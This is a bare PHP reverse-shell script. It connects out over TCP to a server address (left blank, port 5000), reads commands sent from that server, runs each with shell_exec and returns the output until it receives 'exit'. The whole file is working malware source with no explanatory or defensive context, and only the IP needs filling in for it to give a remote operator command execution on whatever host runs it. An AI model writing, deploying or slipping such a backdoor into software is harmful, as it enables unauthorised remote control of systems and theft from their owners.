<?php

function execute_command($command) {
  return shell_exec($command);
}

$server_ip = "";
$server_port = 5000;

try {
  $s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  socket_connect($s, $server_ip, $server_port);

  while(True) {
    $command = socket_read($s, 1024, PHP_NORMAL_READ);

    if(strtolower(trim($command)) == 'exit') {
      break;
    }

    $output = execute_command($command);
    socket_write($s, $output, strlen($output));
  }

  socket_close($s);
} catch (Exception $e) {
}

?>
